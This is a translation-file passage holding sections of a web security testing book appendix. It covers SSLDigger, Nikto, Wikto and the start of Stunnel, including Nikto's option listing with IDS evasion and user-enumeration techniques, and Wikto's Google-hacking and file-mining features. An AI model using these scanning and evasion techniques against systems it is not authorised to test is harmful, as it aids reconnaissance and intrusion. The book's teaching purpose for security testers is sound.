        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>SSLDigger</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>SSLDigger was written by Mark Curphey, and it's one of the free tools offered on the Foundstone Web site. It allows you to test an SSL-enabled Web server to determine which encryption algorithms it supports. This is important because if weak or even NULL ciphers are permitted, an attacker could trick the client and server into negotiating down to an encryption that he could easily decrypt, or trick them into using no encryption at all. For sensitive data, only the strongest encryption schemes should be allowed.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>SSLDigger is simple to use. It can analyze either a single site or read multiple URLs from a file. Here it is in action.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-24. SSLDigger testing cipher strengths.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A company may have a good reason for configuring weaker SSL ciphers, especially if it does business with a lot of other countries where stronger ciphers may not be available to customers. The &amp;quot;Weak Security&amp;quot; header may not be something a client needs or even wants to do anything about.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-25. SSLDigger results page.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec9.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03lev1sec11.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>The Human Brain</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec10.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>The Human Brain</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>At the end of the day, the best tool you have available to you is your brain. Security testing is fairly organic and requires the tester to be able to adapt given the behavior (scripting languages, error messages, content, and so on) and be observant during testing.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec10.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Nikto</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Nikto</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Nikto (&lt;a class="docLink" target="_blank" href="http://www.cirt.net/code/nikto.shtml"&gt;http://www.cirt.net/code/nikto.shtml&lt;/a&gt;) is a Perl script that uses RFP's libwhisker at its core. It works great on pretty much anything that can run Perl, but it's probably best on Linux, BSD, and Cygwin&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#app03fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt;. Nikto is a great tool for taking a quick and dirty look at a Web server configuration. It discovers common misconfigurations, default directories and filenames, and missing patches for most of the major Web servers in existence.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="app03fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; Cygwin is a fully functional Linux-like environment that runs under Windows. It will come in extremely handy for anyone doing security testing.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Nikto uses a repository of common problems and misconfigurations that you can identify by crafting specific &lt;tt&gt;GET&lt;/tt&gt; and &lt;tt&gt;POST&lt;/tt&gt; requests. You can also customize it easily. Using libwhisker, you make requests for specific pages (that is, http://example.com/CFIDE/) to test for their existence. If the server responds with a &lt;tt&gt;404&lt;/tt&gt; error (the page does not exist or cannot be found), Nikto knows that the vulnerability does not exist in this case. There are, however, two potential problems using this technique:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Some servers are configured to respond to all requests with &lt;tt&gt;200&lt;/tt&gt; (or OK) response codes, within which is a page that displays an error message. The tool has to be aware of the page contents to determine that this is the case, and Nikto merely complains that it has &lt;tt&gt;received over 30+ positive responses, and you should hand-verify the results&lt;/tt&gt;. Although this breaks the HTTP specifications, it's a useful basic protection technique against automated vulnerability scanning. All tests come back as positives, yielding a morass of results that the tester must wade through, rendering the automated tool almost useless. For all of Nikto's strengths, this is a serious drawback. A Web server that is configured this way will render Nikto just about useless without some customization.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Nikto focuses on testing for known vulnerabilities. Although it does have some &amp;quot;mutate&amp;quot; functionality to provide a little more flexibility, it is not a tool to find issues like buffer overflows in Common Gateway Interface (CGI) programs. Most likely, if content is installed in a directory that is not a default or a common directory name, Nikto probably won't find it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>To scan servers that require SSL to access their content, you need the &lt;tt&gt;Net::SSL&lt;/tt&gt; Perl modules. The easiest way to do this under Linux or Cygwin is by using the &lt;tt&gt;cpan&lt;/tt&gt; script that employs the CPAN modules to install modules via the network. If your distribution does not include a &lt;tt&gt;cpan&lt;/tt&gt; command, you can still access this functionality. Here's how:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>(if you do not have the 'cpan' command)
[carric@fatty carric]$perl &amp;ndash;MCPAN &amp;ndash;e shell

(&lt;span class="docEmphasis"&gt;/usr/bin/cpan is present&lt;/span&gt;)
[carric@fatty carric]$cpan
$ cpan
We have to reconfigure CPAN.pm due to following
 uninitialized parameters:
...
(the first time this is run, you will be prompted
 for several configuration options &amp;ndash; the defaults
 work pretty well)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This will get you into the &lt;tt&gt;cpan&lt;/tt&gt; shell, which allows you to install modules or search &lt;a class="docLink" target="_blank" href="http://cpan.org"&gt;cpan.org&lt;/a&gt; for available Perl modules. If you do not have the &lt;tt&gt;cpan&lt;/tt&gt; command and would like to have it for future CPAN Perl modules, install the following:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>cpan&amp;gt;   install Bundle::LWP
[... lots of stuff ...]
cpan&amp;gt;   install Bundle::CPAN
[... lots of stuff ...]
cpan&amp;gt;   Install Net::SSL
[... lots of stuff ...]
cpan&amp;gt;   exit</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Now that you have everything you need to run Nikto, let's update and then see what options are available:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>[carric@fatty carric]$./nikto &amp;ndash;update
+ Retrieving 'server_msgs.db'
+ Retrieving 'scan_database.db'
+ Retrieving 'nikto_core.plugin'
+ Retrieving 'outdated.db'
+ Retrieving 'CHANGES.txt'
+ www.cirt.net message: Version 2.0 is still
 coming...

[carric@fatty carric]$./nikto
&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;-
- Nikto 1.35/1.33     -     www.cirt.net
+ ERROR: No host specified
   Options:
-Cgidirs+
                 Scan these CGI dirs: 'none', 'all',
 or value like '/cgi/'
-cookies         print cookies found
-evasion+        ids evasion technique (1-9, see
 below)
    -findonly         find http(s) ports only, don't
 perform a full scan
-Format          save file (-o) Format: htm, csv or
 txt (assumed)
-generic         force full (generic) scan
-host+           target host
-id+             host authentication to use, format
 is      userid:password
-mutate+          mutate checks (see below)
-nolookup         skip name lookup
-output+          write output to this file
-port+            port to use (default 80)
-root+            prepend root value to all
 requests, format is /directory
-ssl              force ssl mode on port
-timeout          timeout (default 10 seconds)
-useproxy         use the proxy defined in
 config.txt
-Version          print plugin and database versions
-vhost+           virtual host (for Host header)
   + requires a value

These options cannot be abbreviated:
-config+          use this config file
-debug            debug mode
-dbcheck          syntax check scan_database.db and
 user_scan_database.db
-update           update databases and plugins from
 cirt.net
-verbose          verbose mode

IDS Evasion Techniques:
        1       Random URI encoding (non-UTF8)
        2       Directory self-reference (/./)
        3       Premature URL ending
        4       Prepend long random string
        5       Fake parameter
        6       TAB as request spacer
        7       Random case sensitivity
        8       Use Windows directory separator (\)
        9       Session splicing

Mutation Techniques:
        1       Test all files with all root
 directories
        2       Guess for password file names
        3       Enumerate user names via Apache
 (/~user type requests)
        4       Enumerate user names via cgiwrap
 (/cgi-bin/cgiwrap/~user type requests)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Many of the options are beyond the scope of this book, but here are the ones you will use the most often:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;tt&gt;-h&lt;/tt&gt; for specifying the host</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;tt&gt;-p&lt;/tt&gt; for specifying the TCP port on which the Web server is listening</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;tt&gt;-o&lt;/tt&gt; for specifying a filename for the report (something like &lt;tt&gt;-o www.servername.com-nikto&lt;/tt&gt; or &lt;tt&gt;-o 192.168.1.1-nikto&lt;/tt&gt;)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;tt&gt;-r&lt;/tt&gt;, which lets you specify a root directory to which you want all checks appended, such as if you have a site that is &lt;a class="docLink" target="_blank" href="http://www.target.com"&gt;www.target.com&lt;/a&gt; and it has &lt;tt&gt;/dev&lt;/tt&gt; and &lt;tt&gt;/prod&lt;/tt&gt; directories</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;tt&gt;-F&lt;/tt&gt; for specifying the format for your output file (HTM, TXT, CSV)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For legitimate testing, you shouldn't need to use the IDS evasion features very often. You could do this with cooperation from the IDS team to see what the tool looks like on the wire when it is trying to be stealthy, or if the target host owner is not supposed to be aware of testing that is being conducted.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03lev1sec3.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Wikto</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Wikto</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If you like the functionality of Nikto and you would like to throw in the Google Hacking Database and use the Google search engine to case your client, look at SensePost's Wikto at &lt;a class="docLink" target="_blank" href="http://www.sensepost.com/research/wikto"&gt;http://www.sensepost.com/research/wikto&lt;/a&gt;. Wikto isn't revolutionary in its approach, but it ties several tools together, and it's written in C#.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>After you have created a free SensePost account (required to access most of their tools), you will find adequate instructions on installing this tool and using its supporting tools (HTTPrint and HTTrack), so let's go straight to using it. You first need to configure it using the SystemConfig tab.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-2. Configuring Wikto.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Following are the critical pieces:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.ol.li.div.p.text">
          <source>Get a Google developer's ID if you do not have one. It's free.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.ol.li.div.p.text">
          <source>Ensure that the HTTPrint and HTTrack tools are installed and you have the correct path set.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.ol.li.div.p.text">
          <source>Update the NiktoDB and the Google Hacking Database (GHDB).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.ol.li.div.p.text">
          <source>Save your configuration somewhere.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The logical place to start is the first tab, Mirror &amp;amp; Fingerprint. Enter the target address, decide whether you want to mirror, fingerprint, or both, and then click Start. I am going to fingerprint &lt;a class="docLink" target="_blank" href="http://www.foundstone.com"&gt;www.foundstone.com&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Wikto thinks this is Apache, but it reported itself as WebSTAR. There's nothing too complicated here, so we move on to the Wikto tab. This uses the Nikto database and the GHDB that you updated when you installed to perform all those checks. If you are not familiar with the GHDB, please go to &lt;a class="docLink" target="_blank" href="http://johnny.ihackstuff.com"&gt;http://johnny.ihackstuff.com&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-3. Mirroring and fingerprinting with Wikto.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>After you click Load DB, you can start scanning.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Some of the more interesting features of this tool are the fact that you can import results from the other tests you may have run. &lt;tt&gt;Import from BackEnd&lt;/tt&gt; imports results from the Backend tool that guesses directories and filenames. &lt;tt&gt;import from Googler&lt;/tt&gt; does the same for the Googler tool results. This version of Wikto is supposed to help with false positives from sites that answer bad requests. As we discussed above, in Nikto, this causes piles of false positives, which may be another compelling reason to use this tool. Ideally, you will be able to run multiple tools, though.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>As the scan progresses, the current check is highlighted. Alerts pop up in the top-right window, and details appear in the bottom right. As an example, Wikto just found that this sever has HTTP TRACE enabled, which is an extraneous method for debugging Web servers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-4. Looking for interesting findings&amp;mdash;a combination of Nitko and Google hacking.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The BackEnd tab is interesting. It has the same capability for importing results as other tools used, but it also allows the user to enter custom directories and file extensions by hand. It crafts requests with either the &lt;tt&gt;GET&lt;/tt&gt; or the &lt;tt&gt;HEAD&lt;/tt&gt; method and uses a list of known directories and filenames and file extensions with customizable response codes. (It's yet another countermeasure against non-RFC-compliant Web servers that are doing strange things in an attempt to make them more difficult to scan.) This could lead to the discovery of content that was not meant for you to find, such as backups of files or directories, administrative interfaces, user directories, and password files.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-5. Mining for files.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The next tab is the Googler. If you are familiar with using Google as a hacking tool, you will immediately recognize the usefulness of this tab. If you're a stranger to Google, a few minutes at Johnny's site will probably cause a small light bulb to suddenly appear over your head. It's a tool that automates using Google's meta-search languages like &lt;tt&gt;site:, allinurl:, ext:, etc.&lt;/tt&gt;. This will really only be useful for publicly accessible sites, or sites that Google has spidered. Don't waste any of your thousand-a-day quota of searches you get through your Google ID on intranet applications. Here is a quick check of Foundstone's site for anything containing the word &lt;tt&gt;security&lt;/tt&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-6. Searching for interesting files via Google.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Googler is limited only by your imagination. You can use it to find directory listings, servers with errors, hacked pages, worms like CodeRed, and so on.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The GoogleHacks tool uses Johnny's GHDB to search for response strings or error messages of known vulnerable versions of Web servers and Web applications. This check consists of things people have found and submitted to the GHDB.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Although it is not doing anything new, Wikto looks promising and could save you some time due to its tool consolidation and integration.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-7. Results of Google hacking on the target site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03lev1sec4.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Stunnel</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Stunnel</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
